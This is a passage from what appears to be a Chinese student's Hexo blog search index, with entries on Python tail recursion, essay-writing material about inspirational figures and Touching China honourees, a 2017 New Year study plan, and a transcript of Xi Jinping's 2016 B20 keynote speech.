···</p><blockquote><p>递归函数的优点是定义简单，逻辑清晰。理论上，所有的递归函数都可以写成循环的方式，但循环的逻辑不如递归清晰。</p></blockquote><blockquote><p>使用递归函数需要注意防止栈溢出。在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出。</p></blockquote><blockquote><p>解决递归调用栈溢出的方法是通过尾递归优化，事实上尾递归和循环的效果是一样的，所以，把循环看成是一种特殊的尾递归函数也是可以的。</p></blockquote><blockquote><p>尾递归是指，在函数返回的时候，调用自身本身，并且，return语句不能包含表达式。这样，编译器或者解释器就可以把尾递归做优化，使递归本身无论调用多少次，都只占用一个栈帧，不会出现栈溢出的情况。</p></blockquote><blockquote><p>上面的fact(n)函数由于return n * fact(n - 1)引入了乘法表达式，所以就不是尾递归了。要改成尾递归方式，需要多一点代码，主要是要把每一步的乘积传入到递归函数中。</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>椭圆的准圆（圆与椭圆“切线”和“两直线垂直”的引论）</title>
      <link href="/2017/Monge-Circle-ZZP/"/>
      <url>/2017/Monge-Circle-ZZP/</url>
      <content type="html"><![CDATA[<blockquote><p><a href="https://zhuanlan.zhihu.com/p/26262777" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26262777</a></p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Writing material - Inspirational</title>
      <link href="/2017/Writing-material-Inspirational/"/>
      <url>/2017/Writing-material-Inspirational/</url>
      <content type="html"><![CDATA[<h1 id="尼克·胡哲"><a href="#尼克·胡哲" class="headerlink" title="尼克·胡哲"></a>尼克·胡哲</h1><p>1982年12月4日，胡哲出生于澳大利亚墨尔本。他天生没有四肢，只有左侧臀部以下的位置有一个带着两个脚趾头的小“脚”。尽管身体残疾，但父母并没有放弃对他的教育。胡哲的父亲是一名工程师、母亲是一名护士。在他六岁时，父亲教他如何用身体仅有的“小鸡脚”打字。而母亲则为他特制了一个塑料装置，好让他学会“握笔”写字。八岁时，胡哲的父母把他送入小学。因身体残疾，胡哲饱受同学的嘲笑和欺侮。十岁时，他曾试图在家中的浴缸溺死自己，但没能成功。</p><h2 id="尼克•胡哲：像雕塑一样活着"><a href="#尼克•胡哲：像雕塑一样活着" class="headerlink" title="尼克•胡哲：像雕塑一样活着"></a>尼克•胡哲：像雕塑一样活着</h2><p>原文来自： <a href="http://news.qq.com/photon/tpyk/nick.htm" target="_blank" rel="noopener">http://news.qq.com/photon/tpyk/nick.htm</a></p><p>王崴 图/文</p><p>曾经有一个小男孩瞪大眼睛打量了尼克很久，最后终于吐出一句：“你总算还有一个头。”——这是尼克•胡哲在他演讲时必讲的一个小插曲。只要看一眼尼克，你就会立刻理解为什么小男孩会这么说，进而感叹为什么上帝要制造这样的生命。</p><p>尼克打出生时就没有四肢，只有躯干和头，就像一尊残破的雕像。这幅模样甚至连他的父母都无法接受。可想而知，这样的躯体给尼克造成了多大的困难。他所能利用的身体部位，只有一个长着两根脚趾的小脚，被他妹妹戏称为“小鸡腿”，因为尼克家的宠物狗曾经误以为那个是鸡腿，想要吃掉它。</p><p>尼克不能走路，不能拿东西，并且总要忍受被围观的耻辱。这一度使他非常消沉，以至于想要在浴缸里淹死自己。还好，他在最后一刻，脑海中浮现出父母在他坟前哭泣的样子，于是他放弃了。这是他最正确的选择。活下来，使他有机会看到，原来他的人生有着无尽的希望。</p><p>尼克秉持着一个基督徒的信仰，告诫自己永远不要放弃。他虽然没有健全的四肢，但是有一幅好口才，和一个聪明的大脑。他总是用无比轻松的语调来调侃自己的经历，他永远不在意别人讶异的眼光，并且努力对自己充满自信，而事实上，他确实做到了绝大多数普通人无法做到的事：他成了一名全球知名的励志演说家。</p><p>在尼克19岁的时候，他打电话给学校，推销自己的演讲。在被拒绝52次之后，他获得了一个5分钟的演讲机会和50美元的薪水。从此，他的演讲生涯开启了序幕。他嗓音富有磁性，思路清晰，语言幽默，最关键的，他有与众不同的人生经历可以与别人分享，给所有人坚持下去的力量。在多年磨练当中，他具备了异常坚韧的心智和丰富的阅历。这些精神上的素养完全弥补了肉体上的缺陷，帮助尼克超越了健全的大多数人，取得非凡的成就。</p><p>如今，他已经在全球34个国家发表过超过1500场演讲，每年要接到超过3万个来自世界各地的邀请。所有看过他的视频，或听过他演讲的人，都无不发自内心地诚服于这个曾被预言“永远得不到爱”的人。他已经成为世人心目中与命运顽强斗争的象征，或者说，一尊活的雕塑。</p><p>对于中国，尼克投入了特别的精力。在过去三年中，他每年都来到中国演讲。今年5月14日～17日的西安、武汉之行是他第四次来中国，演讲对象是在校大学生。尼克1982年出生，本身就是80后，跟大学生有不少共鸣。巡讲主办方之一腾讯公益慈善基金会也希望通过尼克感人的讲述，给80后、90后的年轻一代以启迪。</p><p>在演讲中，尼克讲到：“我从小就在镜子旁边贴着一张非洲难民儿童的照片，现在我奋斗的目标之一仍然是帮助这些贫困的人。”“就我这副身板，戴上帽子在街头也会立刻被别人认出来，所以我已经很出名了，我不是为了沽名钓誉。我不在乎别人怀疑我，只要我做的事能改变哪怕一个生命，这一切奔波都值得了。”</p><p>“有人问我，我觉得自己是这世界上最快乐的人吗？我要说是的。我对人生的三个真谛——价值、目标、宗旨都很清楚，我知道我要往哪里去，所以我很快乐。无论怎样，满足于你所拥有的，比如我，就很珍惜我的‘小鸡腿’，不要放弃，爱别人，每天向前走一小步，你一定可以完成人生的目标。”</p><h1 id="肖恩·斯沃纳（SeanSwarner）：第一位翻越七大洲最高峰的癌症幸存者"><a href="#肖恩·斯沃纳（SeanSwarner）：第一位翻越七大洲最高峰的癌症幸存者" class="headerlink" title="肖恩·斯沃纳（SeanSwarner）：第一位翻越七大洲最高峰的癌症幸存者"></a>肖恩·斯沃纳（SeanSwarner）：第一位翻越七大洲最高峰的癌症幸存者</h1><p>　　<br>　虽然患过两次癌症——淋巴癌和阿斯金肉瘤，后者甚至使他失去了右肺，但肖恩·斯沃纳一直都以乐观向上的态度面对生活。也许正是这种积极的生活态度，才让他取得了与疾病战争的一次次胜利。2001年，肖恩订下了目标：成为第一个登上珠穆朗玛峰的癌症幸存者。这个目标实现后，他又先后登上了非洲的乞力马扎罗山、欧洲的阿尔卑斯山、南非的阿空家瓜山、澳洲的科休斯克山、南极的文森山以及北美的德纳利山，它们分别是这六个洲的最高峰。</p><h2 id="英文原版材料：重定义不可能"><a href="#英文原版材料：重定义不可能" class="headerlink" title="英文原版材料：重定义不可能"></a>英文原版材料：重定义不可能</h2><p><a href="http://seanswarner.com/redefining-impossible-with-sean-swarner/" target="_blank" rel="noopener">http://seanswarner.com/redefining-impossible-with-sean-swarner/</a></p><h1 id="Liz-Murray-《风雨哈佛路》"><a href="#Liz-Murray-《风雨哈佛路》" class="headerlink" title="Liz Murray : 《风雨哈佛路》"></a>Liz Murray : 《风雨哈佛路》</h1><p><a href="https://book.douban.com/subject/5408860/" target="_blank" rel="noopener">https://book.douban.com/subject/5408860/</a><br><a href="https://book.douban.com/review/4590332/" target="_blank" rel="noopener">https://book.douban.com/review/4590332/</a><br><a href="http://baike.baidu.com/subview/367674/9776109.htm" target="_blank" rel="noopener">http://baike.baidu.com/subview/367674/9776109.htm</a><br><a href="https://www.amazon.cn/dp/B016BW1MV6/" target="_blank" rel="noopener">https://www.amazon.cn/dp/B016BW1MV6/</a></p><h1 id="Randy-Pausch-：-《真正实现你的童年梦想》"><a href="#Randy-Pausch-：-《真正实现你的童年梦想》" class="headerlink" title="Randy Pausch ： 《真正实现你的童年梦想》"></a>Randy Pausch ： 《真正实现你的童年梦想》</h1><p><a href="https://movie.douban.com/subject/4603382/reviews" target="_blank" rel="noopener">https://movie.douban.com/subject/4603382/reviews</a><br><a href="https://drive.google.com/open?id=1M7FVLEKltp64I14CU8jnlou1ccUXZBQUM9EMdScubCn0t9buZYCjgeivp8OS767EEHYUKBGxLURhFa5C" target="_blank" rel="noopener">https://drive.google.com/open?id=1M7FVLEKltp64I14CU8jnlou1ccUXZBQUM9EMdScubCn0t9buZYCjgeivp8OS767EEHYUKBGxLURhFa5C</a></p><h1 id="Portal-：-材料入口"><a href="#Portal-：-材料入口" class="headerlink" title="Portal ： 材料入口"></a>Portal ： 材料入口</h1><p><a href="http://blog.renren.com/share/240127745/2115399206" target="_blank" rel="noopener">http://blog.renren.com/share/240127745/2115399206</a></p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>我私藏的文集</title>
      <link href="/2017/My-Docs-in-School/"/>
      <url>/2017/My-Docs-in-School/</url>
      <content type="html"><![CDATA[<p>托管在Google Docs，（需要翻墙）。</p><p><a href="https://drive.google.com/open?id=0B6lq-lTh_iSXNVZabG1MV0hVR1VGYThfNXVpQjJCNWluV0gw" target="_blank" rel="noopener">https://drive.google.com/open?id=0B6lq-lTh_iSXNVZabG1MV0hVR1VGYThfNXVpQjJCNWluV0gw</a><br>奇风岁月（读书笔记）.pdf</p><p><a href="https://drive.google.com/open?id=0B6lq-lTh_iSXSVFiaHgtOHlFUXM" target="_blank" rel="noopener">https://drive.google.com/open?id=0B6lq-lTh_iSXSVFiaHgtOHlFUXM</a><br>卤素元素数据.doc</p><p><a href="https://drive.google.com/open?id=0B6lq-lTh_iSXUFR4QW5YdjZ4dWc" target="_blank" rel="noopener">https://drive.google.com/open?id=0B6lq-lTh_iSXUFR4QW5YdjZ4dWc</a><br>化学等效平衡.docx</p><p><a href="https://drive.google.com/open?id=0B6lq-lTh_iSXajIyVXAySTgtSUNtYWY3RDBXTjVMQm9oV3ZB" target="_blank" rel="noopener">https://drive.google.com/open?id=0B6lq-lTh_iSXajIyVXAySTgtSUNtYWY3RDBXTjVMQm9oV3ZB</a><br>一个名叫欧维的男人准备自杀（读书笔记）.pdf</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Writing material - Dedication</title>
      <link href="/2017/Writing-material-Dedication/"/>
      <url>/2017/Writing-material-Dedication/</url>
      <content type="html"><![CDATA[<h1 id="奉献"><a href="#奉献" class="headerlink" title="奉献"></a>奉献</h1><h2 id="微尘-2007"><a href="#微尘-2007" class="headerlink" title="微尘-2007"></a>微尘-2007</h2><p>  微尘：上千笔捐款中，很多捐助者都署名“微尘”</p><p>  【团体介绍】“微尘”：起初，是青岛一位数次捐款不留姓名的普通市民；后来，扩散成一个爱心群体；再后来，扩展成一个关爱他人的爱心符号；以微尘命名的募捐箱、徽章，走进青岛的大街小巷。“微尘”在印度洋海啸、湖南水灾、喀什地震以及非典时期数次向灾区捐款，多次救助贫困患病儿童和福利院孤儿。大家都觉得我们的社会需要这样有公益心的人，不一定要有多少钱才可以，重要的是有这样的爱心。微尘是个值得尊重的人，她不图名、不图利，只想以自己的方式做善事，同时大家希望微尘这两个字成为青岛公益事业的一个符号。在她的感召下，越来越多的人热心公益、无私奉献、关爱他人。“微尘”已成为青岛市一个体现爱心的公益品牌，当选为2005年“全国十大社会公益之星”，并荣获中华慈善奖。</p><p>  【主要事迹】“微尘”起初是青岛一位数次捐款不留姓名的普通市民，后来，扩散成一个爱心群体，再后来，扩展成一个关爱他人的爱心符号。以“微尘”命名的募捐箱、徽章，走进青岛的大街小巷，成为青岛一个体现爱心的公益品牌。青岛市红十字会的工作人员在翻阅了捐款记录后惊讶地发现，早在2004年，一位神秘女士就已经使用“微尘”的名字多次大额捐款：非典时期捐款2万元，新疆喀什地震捐款5万元，为白血病儿童捐款1万元，湖南灾区捐款5万元……当人们正在努力寻找“微尘”时，一个又一个“微尘”出现了。截至目前，青岛市红十字会收到的上千笔捐款中，很多捐助者都署名“微尘”。每一双充满善意的援手，每一张不同模样的面孔，都记录下一个共同的名字——“微尘”。【颁奖词】他来自人群，像一粒尘土，微薄、微细、微乎其微，寻找不到，又随处可见。他自认渺小，却塑造了伟大，这不是一个人的名字，这是一座城市的良心。</p><h2 id="郭明义-2011"><a href="#郭明义-2011" class="headerlink" title="郭明义-2011"></a>郭明义-2011</h2><p>“雷锋传人”——郭明义:</p><p>　　感动中国事迹:</p><p>　　郭明义，男，1958年12月生，辽宁鞍山人，1982年复员到齐大山铁矿工作。1996年至今，任齐大山铁矿生产技术室采场公路管理员。</p><p>　　入党30年来，他时时处处发挥先锋模范作用，在每个工作岗位上都取得了突出的业绩。从1996年开始担任采场公路管理员以来，他每天都提前2个小时上班，15年中，累计献工15000多小时，相当于多干了五年的工作量。工友们称他是”郭菩萨”、”活雷锋”，矿业公司领导则称因郭明义使整个”矿山人”的精神得到了升华。</p><p>　　他20年献血6万毫升，是其自身血液的10倍多。2002年，郭明义加入中华骨髓库，成为鞍山市第一批捐献造血干细胞志愿者。2006年，郭明义成为鞍山市第一批遗体和眼角膜自愿捐献者。</p><p>　　1994年以来，他为希望工程、身边工友和灾区群众捐款12万元，先后资助了180多名特困生，而自己的家中却几乎一贫如洗。一家3口人至今还住在鞍山市千山区齐大山镇，一个80年代中期所建的、不到40平方米的单室里。</p><p>　　郭明义曾先后获部队学雷锋标兵、鞍钢劳动模范、鞍山市特等劳动模范、全国无偿献血奉献奖金奖、中央企业优秀共产党员、全国”五一劳动奖章”等荣誉称号，是鞍山市无偿献血形象代言人。</p><p>　　颁奖词:他总看别人，还需要什么；他总问自己，还能多做些什么。他舍出的每一枚硬币，每一滴血都滚烫火热。他越平凡，越发不凡，越简单，越彰显简单的伟大。</p><h2 id="王万青-2011"><a href="#王万青-2011" class="headerlink" title="王万青-2011"></a>王万青-2011</h2><p>草原曼巴——王万青</p><p>　　感动中国事迹:</p><p>　　王万青，男，汉族，66岁，上海人，中共党员，甘肃省甘南藏族自治州玛曲县人民医院外科主任医师。2003年退休。</p><p>　　1968年从上海第一医学院毕业后，自愿到条件极为艰苦的甘南州玛曲县工作，在贫穷落后的玛曲草原一呆就是42年，其间，他放弃了多次回上海的机会，凭着对玛曲人民、对藏族同胞的深厚感情，艰难地通过了生活关、语言关，毅然选择长期留守在高原。40多年来，他视藏乡为故乡，视牧民为亲人，克服重重困难，全心全意为牧民群众解除病痛，得到了广泛的尊敬和爱戴，书写了一段藏汉水乳交融的民族团结佳话。</p><p>　　王万青在阿万仓卫生院的20余年时间里，每年接诊病人3500余人次（当时阿万仓乡总人口3400余人），20年累计接诊7万余人，累计手术上万例，在当时医疗设备不足、乡卫生院基础设施极其简陋的条件下，他以精湛的医术，以一名医生高度的责任心成功救治了无数个生命垂危的患者。在任阿万仓乡卫生院院长的10年中，他建立了全乡3000余人的门诊病历，使全乡90%的牧民有了健康档案，为开展牧民发病情况分析和提高救治质量奠定了良好基础。调到玛曲县人民医院后，他开展的许多手术填补了玛曲高原外科手术的空白。</p><p>　　王万青高度重视高原疾病预防控制工作，为此，他和藏族妻子凯嫪一起起早贪黑，逐一给当地牧民实施预防接种。他曾背着X光机、心电图机，骑马去冬窝子（冬季定居点）为牧民进行健康体检。 1981年他一人独立完成了全乡布病普查任务，因阿万仓乡地域黄河上没有桥也无渡船，为了开展计划免疫，他曾经抓着马尾巴冒险来往黄河两岸。1985年阿万仓乡“四苗”接种率达到85%，成为当时玛曲县至甘南州计划免疫工作的先进典型。</p><p>　　现在他的家人子女全都生活、工作在这片土地上，可以说他把一生都奉献给了这片草原，奉献给了玛曲的卫生事业和这里的人民。如今虽然退休了，但他仍然坚持经常指导县医院的外科手术，并经常在家里给上门的藏族群众治病送药，群众亲切地称他为“草原曼巴（好医生）”。他的这种扎根玛曲高原，情系医疗卫生事业的无私奉献精神，在玛曲草原从80年代开始到今天被传为佳话。</p><p>　　颁奖词：只身打马赴草原，他一路向西，千里万里，不再回头，风雪行医路，情系汉藏缘。四十载流年似水，磨不去他对理想的忠诚。春风今又绿草原，门吧的故事还会有更年轻的版本。</p><h2 id="勇于献身的科学家-鲍尔-海斯德"><a href="#勇于献身的科学家-鲍尔-海斯德" class="headerlink" title="勇于献身的科学家  鲍尔.海斯德"></a>勇于献身的科学家  鲍尔.海斯德</h2><p>  鲍尔.海斯德是美国一位研究蛇毒的科学家。他小时候看到全世界每年有成千上万人被 毒蛇咬死，就决心研究出一种抗蛇毒药。他从15岁起，就在自己身上注射微量的毒蛇腺体分泌的毒素， 并逐渐加大剂量与毒性。这种试验是极其危险和痛苦的。每注射一次，他都要大病一场。 各种蛇的蛇毒成分不同，作用方式也不同，每注射一种新的蛇毒，原来的抗毒物质不能胜任，又要经受一种新的抗毒 物质折磨。他身上先后注射过 28 种蛇毒。经过危险与痛苦的试验，终于有了收获。他一共被毒蛇咬过 130 次，每次都安然无恙。海斯德对自己血液中的抗毒物质进行分析，试制了一些抗蛇毒的药物，已救治了很多被毒蛇咬伤的人。 </p><p>  [点拨] 鲍尔.海斯德忍住痛苦，向自己体内注射毒素时，他已经将自己的生死置之度外，想到的却是救治被毒蛇咬伤人的生命。这种奉献的精神，又岂止是“无私”一词可概括的？ </p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Writing material - Origin</title>
      <link href="/2017/Writing-material-Origin/"/>
      <url>/2017/Writing-material-Origin/</url>
      <content type="html"><![CDATA[<h1 id="先放上材料来源，以示版权"><a href="#先放上材料来源，以示版权" class="headerlink" title="先放上材料来源，以示版权"></a>先放上材料来源，以示版权</h1><p><a href="https://www.zhihu.com/question/31725355" target="_blank" rel="noopener">https://www.zhihu.com/question/31725355</a><br><a href="https://www.zhihu.com/question/20545734" target="_blank" rel="noopener">https://www.zhihu.com/question/20545734</a></p><h1 id="先奉献的爱-by-刘墉"><a href="#先奉献的爱-by-刘墉" class="headerlink" title="先奉献的爱 by 刘墉"></a>先奉献的爱 by 刘墉</h1><p>王太太是个孤僻的人，跟邻居从不往来。有一天她正在烧饭，突然听见邻居家的李小妹尖声哭喊。她从窗子望出去，发现一股浓烟正从李家的屋里冒出来。王太太慌忙跑出去，孩子的哭叫声更大了。想必父母不在家，眼看浓烟并未夹带着火苗，一向胆小的王太太居然鼓足勇气冲了进去，岂知才抱起李小妹，身后突然蹿起熊熊火焰。当她用毛毯把李小妹包着冲出火窟时，已经头发全焦，身体多处灼伤。</p><p>就在这次火灾发生之后，王太太的孤僻脾气居然改了，她尤其关心李小妹，总是买些东西送给她，并问长问短，有时候李小妹不用功、不听话，王太太都能气得哭。许多朋友不解地问：“你以前从来不关心邻居，为什么现在对李小妹好得甚至超过自己的孩子呢？”</p><p>“因为我差点为她送了命！”</p><p>人们的爱，往往并不一定起于别人爱自己之后的回报，却可能源于自己最先的奉献与牺牲。牺牲愈大，爱得愈深。</p><h1 id="感动中国2015"><a href="#感动中国2015" class="headerlink" title="感动中国2015"></a>感动中国2015</h1><p><a href="https://zhidao.baidu.com/question/1639308473312696060.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/1639308473312696060.html</a></p><h1 id="感动中国2016"><a href="#感动中国2016" class="headerlink" title="感动中国2016"></a>感动中国2016</h1><p><a href="http://mt.sohu.com/20160215/n437419161.shtml" target="_blank" rel="noopener">http://mt.sohu.com/20160215/n437419161.shtml</a></p><h1 id="感动中国2014"><a href="#感动中国2014" class="headerlink" title="感动中国2014"></a>感动中国2014</h1><p><a href="http://www.lz13.cn/ganenlizhi/20637.html" target="_blank" rel="noopener">http://www.lz13.cn/ganenlizhi/20637.html</a></p><h1 id="感动中国2002-2013"><a href="#感动中国2002-2013" class="headerlink" title="感动中国2002~2013"></a>感动中国2002~2013</h1><p><a href="http://www.360doc.com/content/14/0211/22/907678_351746654.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/14/0211/22/907678_351746654.shtml</a></p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017新年寄语：我们的2017 + 2017上半年计划</title>
      <link href="/2016/2017-New-Year-Celebration/"/>
      <url>/2016/2017-New-Year-Celebration/</url>
      <content type="html"><![CDATA[<h1 id="2017新年寄语-前言"><a href="#2017新年寄语-前言" class="headerlink" title="2017新年寄语 - 前言"></a>2017新年寄语 - 前言</h1><p>  各种不爽，今天是哭着过来的。。。。。。</p><h1 id="2017新年寄语-元旦贺词：我们的2017"><a href="#2017新年寄语-元旦贺词：我们的2017" class="headerlink" title="2017新年寄语 - 元旦贺词：我们的2017"></a>2017新年寄语 - 元旦贺词：我们的2017</h1><p>  2017年的钟声即将敲响，在过去的一年中，我们风雨同舟，共同经历高中3年中大部分的风风雨雨。感谢过去几年中各位老师、家长、朋友、同学的陪伴，因为有你，我的人生更加精彩。感谢现在不在我身边的朋友们，因为有你，我的生命更加璀璨。感谢老师、家长对我的鞭策，因为有你，我的前途少了些许黑暗。感谢朋友、同学对我的鼓励和陪伴，因为有你，我的生命更加温暖动人。</p><p>  回望过去，展望未来。时光如白驹过隙，过去的时光再也无法找回，永远地封存在我们的记忆中。过去的一年中，对于那些我无意中伤害了的人，对你们说一声诚恳的“抱歉”。对于那些关心我的人，对你们说一声真心的“感谢”。对于陪伴我走过高中三年时光的Gay、Owen、Cindy、Katherine，感谢你们对我的各种毛病的容忍，感谢你们对我的指导与关怀。未来的路，我们必将携手共进！</p><p>  祝所有同学们在属于我们的2017中找到自己的锦绣前程！祝我们的老师、家长们在新的一年里身体健康、万事如意、心想事成！</p><p>  （To xxC: Sweetie, Thanks, Kiss U!Let’s go together to find our beautiful life!）</p><h1 id="2017上半年计划"><a href="#2017上半年计划" class="headerlink" title="2017上半年计划"></a>2017上半年计划</h1><p>   1.奋起直追，把每一次考试当作高考，力争每次考试都能找出自己的缺漏之处并有所提升，努力奋发！<br>   2.一轮复习即将过去，下一步，更多的时间投入题海战术，查缺补漏，找出万变中的不变。<br>   3.填坑： shadowsocks-libev + obfsproxy<br>   4.填坑： 用美剧练练听力<br>   5.填坑： 163music-go re-written using python3<br>   6.填坑： 博文：《土豆漫谈互联网思维》<br>   7.未完待续……</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016年习近平出席B20发表的演讲[国学]</title>
      <link href="/2016/XI-JinPing-B20-Speech/"/>
      <url>/2016/XI-JinPing-B20-Speech/</url>
      <content type="html"><![CDATA[<h1 id="中国发展新起点-全球增长新蓝图-原文"><a href="#中国发展新起点-全球增长新蓝图-原文" class="headerlink" title="中国发展新起点 全球增长新蓝图 [原文]"></a>中国发展新起点 全球增长新蓝图 [原文]</h1><p>——在二十国集团工商峰会开幕式上的主旨演讲</p><p>（2016年9月3日，杭州）</p><p>中华人民共和国主席 习近平</p><p>　　女士们，先生们，朋友们：</p><p>　　下午好！很高兴同大家在杭州相聚。明天，二十国集团领导人峰会就要拉开帷幕。国际社会期待着这次峰会，工商、智库、劳动、妇女、青年等社会各界也期待着这次峰会。大家目标高度一致，那就是推动杭州峰会取得丰硕成果。</p><p>　　杭州是中国的一个历史文化重镇和商贸中心。千百年来，从白居易到苏东坡，从西湖到大运河，杭州的悠久历史和文化传说引人入胜。杭州是创新活力之城，电子商务蓬勃发展，在杭州点击鼠标，联通的是整个世界。杭州也是生态文明之都，山明水秀，晴好雨奇，浸透着江南韵味，凝结着世代匠心。</p><p>　　我曾在浙江工作了6个年头，熟悉这里的山水草木、风土人情，参与和见证了这里的发展。在中国，像杭州这样的城市有很多，在过去几十年经历了大发展、大变化，许许多多普通家庭用勤劳的双手改变了自己的生活。这一点一滴的变化，集合起来就是磅礴的力量，推动着中国发展进步，折射出中国改革开放的伟大进程。</p><p>　　——这是探索前行的进程。一个13亿多人口的大国实现现代化，在人类历史上没有先例可循。中国的发展注定要走一条属于自己的道路。我们“摸着石头过河”，不断深化改革开放，不断探索前进，开创和发展了中国特色社会主义。</p><p>　　——这是真抓实干的进程。我们紧紧抓住经济建设这个中心不放松，与时俱进，开拓创新，靠着拼劲、闯劲、干劲，靠着钉钉子精神，把中国建成世界第二大经济体、最大货物贸易国、第三大对外直接投资国，人均国内生产总值接近8000美元。</p><p>　　——这是共同富裕的进程。发展为了人民、发展依靠人民、发展成果由人民共享，这是中国推进改革开放和社会主义现代化建设的根本目的。改革开放以来，中国有7亿多人口摆脱贫困，13亿多人民的生活质量和水平大幅度提升，用几十年时间完成了其他国家几百年走过的发展历程。</p><p>　　——这是中国走向世界、世界走向中国的进程。我们奉行独立自主的和平外交政策，坚持对外开放的基本国策，敞开大门搞建设，从大规模引进来到大踏步走出去，积极推动建设更加公正合理的国际秩序，中国同外部世界的互动持续加深，中国的朋友遍布世界。</p><p>　　女士们、先生们、朋友们！</p><p>　　改革开放38年过去，弹指一挥间。今天，随着中国经济体量的增大以及同世界的合作不断加深，中国经济走向受到外界关注。很多人都关心，中国经济能否实现持续稳定增长？中国能否把改革开放推进下去？中国能否避免陷入“中等收入陷阱”？</p><p>　　行胜于言。中国用实际行动对这些问题作出了回答。今年年初，中国出台了国民经济和社会发展第十三个五年规划纲要，围绕全面建成小康社会奋斗目标，针对发展不平衡、不协调、不可持续等突出问题，强调要牢固树立和坚决贯彻创新、协调、绿色、开放、共享的发展理念。</p><p>　　今天的中国，已经站在新的历史起点上。这个新起点，就是中国全面深化改革、增加经济社会发展新动力的新起点，就是中国适应经济发展新常态、转变经济发展方式的新起点，就是中国同世界深度互动、向世界深度开放的新起点。我们有信心、有能力保持经济中高速增长，继续在实现自身发展的同时为世界带来更多发展机遇。</p><p>　　——在新的起点上，我们将坚定不移全面深化改革，开拓更好发展前景。中国经济发展进入新常态，这是中国经济向形态更高级、分工更优化、结构更合理阶段演进的必经过程。要在新常态下保持经济中高速增长，必须依靠改革。因循守旧没有出路，畏缩不前坐失良机。中国改革的方向已经明确、不会动摇；中国改革的步伐将坚定向前、不会放慢。</p><p>　　中国改革已经进入攻坚期和深水区，我们将以壮士断腕的勇气、凤凰涅槃的决心，敢于向积存多年的顽瘴痼疾开刀，敢于触及深层次利益关系和矛盾，把改革进行到底。我们将继续推进供给侧结构性改革，解决好当前经济发展中的主要矛盾，通过优化要素配置和调整产业结构提高供给体系质量和效率，激发市场活力，促进协调发展。我们将继续创新体制机制、突破利益固化藩篱，全面推进依法治国，更好发挥市场在资源配置中的决定性作用，更好发挥政府作用。</p><p>　　——在新的起点上，我们将坚定不移实施创新驱动发展战略，释放更强增长动力。抓住科技创新就抓住了发展的牛鼻子。我们清醒认识到，中国经济发展不少领域大而不强、大而不优，长期以来主要依靠资源、资本、劳动力等要素投入支撑经济增长和规模扩张的方式已不可持续，中国发展正面临着动力转换、方式转变、结构调整的繁重任务。建设创新型国家和世界科技强国，是中国发展的迫切要求和必由之路。</p><p>　　我们正在实施创新驱动发展战略，发挥创新第一动力的作用，努力实现从量的增长向质的提升转变。我们将推广发展理念、体制机制、商业模式等全方位、多层次、宽领域的大创新，在推动发展的内生动力和活力上来一个根本性转变。我们将力争在重大项目、重点方向率先突破，积极牵头实施国际大科学计划和大科学工程。我们将深入研究和解决经济和产业发展急需的科技问题，围绕促进转方式调结构、建设现代产业体系、培育战略性新兴产业、发展现代服务业等方面需求推动科技成果转移转化，推动产业和产品向价值链中高端跃升，塑造更多依靠创新驱动、更多发挥先发优势的引领性发展。</p><p>　　——在新的起点上，我们将坚定不移推动绿色发展，谋求更佳质量效益。我多次说过，绿水青山就是金山银山，保护环境就是保护生产力，改善环境就是发展生产力。这个朴素的道理正得到越来越多人们的认同。</p><p>　　我们将毫不动摇实施可持续发展战略，坚持绿色低碳循环发展，坚持节约资源和保护环境的基本国策。我们推动绿色发展，也是为了主动应对气候变化和产能过剩问题。今后5年，中国单位国内生产总值用水量、能耗、二氧化碳排放量将分别下降23%、15%、18%。我们要建设天蓝、地绿、水清的美丽中国，让老百姓在宜居的环境中享受生活，切实感受到经济发展带来的生态效益。</p><p>　　从2016年开始，我们正大力推进供给侧结构性改革，主动调节供求关系，要用5年时间再压减粗钢产能1亿至1.5亿吨，用3至5年时间再退出煤炭产能5亿吨左右、减量重组5亿吨左右。这是我们从自身长远发展出发，从去产能、调结构、稳增长出发，自主采取的行动。中国在去产能方面，力度最大，举措最实，说到就会做到。</p><p>　　——在新的起点上，我们将坚定不移推进公平共享，增进更多民众福祉。民惟邦本，本固邦宁。坚持以人民为中心，就要扎扎实实体现在经济社会发展各方面各环节。</p><p>　　我们将顺应人民对美好生活的向往，不断提高人民生活质量和水平，健全公共服务体系，扩大中等收入者比重。特别是要加大对困难群众精准帮扶力度，在2020年前实现现行标准下5700多万农村贫困人口全部脱贫，贫困县全部摘帽。改革开放以来，中国使7亿多人摆脱贫困，占全球减贫人口的70%以上，为世界减贫事业作出了重大贡献。中国将继续为全球反贫困作出贡献。我们将更加注重公平公正，在做大发展蛋糕的同时分好蛋糕，从人民最关心最直接最现实的利益问题出发，让百姓有更多成就感和获得感。</p><p>　　——在新的起点上，我们将坚定不移扩大对外开放，实现更广互利共赢。奉行互利共赢的开放战略，不断创造更全面、更深入、更多元的对外开放格局，是中国的战略选择。中国对外开放不会停滞，更不会走回头路。</p><p>　　我们将继续深入参与经济全球化进程，支持多边贸易体制。我们将加大放宽外商投资准入，提高便利化程度，促进公平开放竞争，全力营造优良营商环境。同时，我们将加快同有关国家商签自由贸易协定和投资协定，推进国内高标准自由贸易试验区建设。在有序开展人民币汇率市场化改革、逐步开放国内资本市场的同时，我们将继续推动人民币走出去，提高金融业国际化水平。</p><p>　　